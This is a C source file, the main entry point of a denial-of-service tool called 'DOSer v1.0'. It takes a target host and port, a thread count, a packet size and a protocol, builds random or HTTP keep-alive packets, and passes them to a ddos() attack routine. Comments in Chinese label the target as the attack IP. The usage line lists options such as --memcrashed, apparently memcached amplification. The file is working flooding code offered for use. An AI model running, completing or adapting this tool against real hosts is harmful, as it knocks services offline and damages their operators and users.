//
//  main.c
//
//
//  Created by Jimmy Ren on 11.23.2019.
//  Copyright © 2019 Jimmy Ren. All rights reserved.
//

#include <stdbool.h>
#include <time.h>
#include <stdint.h>

#include "dos.h"
#include "message.h"
#include "socket.h"
#include "ping.h"
#include "packet.h"


bool socket_wait;

int main(int argc, const char* argv[])
{
    socket_wait = true;
    hide_warnings = false;
    srand(time(NULL));
    if(!checklarg("--hide-logo", argv, argc)){
        printf("█████╗  ╔██████╗ ███████╗███████╗██████╗\n");
        printf("██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗\n");
        printf("██║  ██║██║   ██║███████╗█████╗  ██████╔╝\n");
        printf("██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗\n");
        printf("██████╔╝╚██████╔╝███████║███████╗██║  ██║\n");
        printf(" ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n");
        printf("                                             v1.0-first-try\n");
    }
    info("DOSer v1.0 by Jimmy(NJUPT IOT)");

    if (argc < 3 || checkarg("-h", argv, argc)) {
        info("Usage:%s -[h] <HOST> <PORT> -[r] -t <THREAD COUNT> -s <PACKET SIZE> [--http --no-warnings --no-check --no-wait --no-status --packetfile <FILENAME> --memcrashed --ipfile <FILENAME>]", argv[0]);
        return 0;
    }
    const char* _host = argv[1];  //输入的攻击IP或域名
    char* host = (char*)malloc(sizeof(char) * 14);
    info("Starting up");
    if (hostname2ip(_host, host)) {
        error("Failed to resolve host:%s", _host);

        return -1;
    }
    use_dos_sleep=checklarg("--sleep",argv,argc);
    status=!checklarg("--no-status", argv, argc);
    if(use_dos_sleep){
        const char* RAW_SLEEP=getlarg("--sleep",argv,argc);
        dos_sleep=atoi(RAW_SLEEP);
    }
    if(dos_sleep<0){
        die("Invalid sleep argument");
    }
    int port = atoi(argv[2]);
    if (port < 0) {
        error("Bad port supplied!");
        return -1;
    }
    hide_warnings = checklarg("--no-warnings", argv, argc);
    hide_errors = checklarg("--no-errors", argv, argc);
    bool RANDOM_PACKET = checkarg("-r", argv, argc);
    int THREAD_COUNT = 5;
    size_t PACKET_SIZE = 4096;
    bool USE_HTTP = checklarg("--http", argv, argc);
    if (checkarg("-s", argv, argc)) {
        const char* raw_packetsize = getarg("-s", argv, argc);
        PACKET_SIZE = atoi(raw_packetsize);
    }
    if (checkarg("-t", argv, argc)) {
        const char* raw_threadcount = getarg("-t", argv, argc);
        THREAD_COUNT = atoi(raw_threadcount);
    }
    char* packet = NULL;
    if (PACKET_SIZE <= 0) {
        error("Bad packet size!");
        return -1;
    }

    if (!USE_HTTP) {

        packet = randstring(PACKET_SIZE);
    } else {
        packet = (char*)malloc(sizeof(char) * 35);
        packet = "HTTP/1.1 GET /\r\nConnection:keep-alive\r\n\r\n";
    }
    if (THREAD_COUNT <= 0) {
        error("Bad thread count!");
        return -1;
    }

    int PROTOCOL = MODE_EMPTY;    //选择的协议
    if (checkarg("-u", argv, argc)) {
        PROTOCOL = MODE_UDP;
    }
    if (checklarg("--packetfile", argv, argc)) {
        packet = readfile(getlarg("--packetfile", argv, argc));
        if (packet == 0) {
            error("Failed to read packet file!");
            error("Exiting!");
            return -1;
        }
        PACKET_SIZE = strlen(packet);
    }
    metrics=SIZE_MB;
    if(checklarg("--metrics", argv, argc)){

        metrics=str2metrics(getlarg("--metrics", argv, argc));
        if(metrics==255){
            die("Bad metrics argument");
        }
    }
    hide_warnings = checklarg("--no-warnings", argv, argc);
   /* bool check = !checklarg("--no-check", argv, argc);*/
    socket_wait = !checklarg("--no-wait", argv, argc);

    //Checking whether host online
/*    if (check) {
        if(is_root()){
            int PING_MAX_TRIES=atoi(sgetlarg("--ping-max-tries", argv, argc, "5"));
            int PING_TIMEOUT=atoi(sgetlarg("--ping-timeout", argv, argc, "2"));
            if(!ping(host,PING_MAX_TRIES,PING_TIMEOUT)){
                die("Host is down.If it just blocking ping packets try running with --no-check option");
            }
        }else{
            warning("To perfom ping check root privilliges required.Add --no-check option to silence this warning or run with root to perform ping check");
        }
    }*/
    if(PROTOCOL==MODE_EMPTY){

        PROTOCOL=MODE_TCP;
    }

    //主要函数：进行攻击
    /*
     * host  --- 攻击域名或IP
     * port  --- 端口号
     * packet --- 包
     * THREAD_COUNT --- 线程数量
     * PROTOCOL  --- 攻击协议
     * */
    ddos(host, port, packet, THREAD_COUNT, PROTOCOL);
    return 0;
}
